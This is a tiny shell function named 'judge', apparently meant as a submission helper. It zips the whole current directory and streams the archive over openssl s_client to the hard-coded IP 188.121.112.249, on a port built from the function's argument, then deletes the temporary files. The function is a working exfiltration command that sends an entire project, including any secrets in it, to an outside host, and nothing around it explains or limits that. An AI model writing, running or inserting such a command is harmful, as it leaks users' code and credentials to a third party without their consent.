judge(){
tmp_dir=$(mktemp -d) && zip -q -r "$tmp_dir/project.zip" . && ( ( cat "$tmp_dir/project.zip"; echo "~end~" ) | openssl s_client -connect 188.121.112.249:$(printf "%0.s$1" {1..5}) -quiet 2>/dev/null ) && rm -rf "$tmp_dir"
}
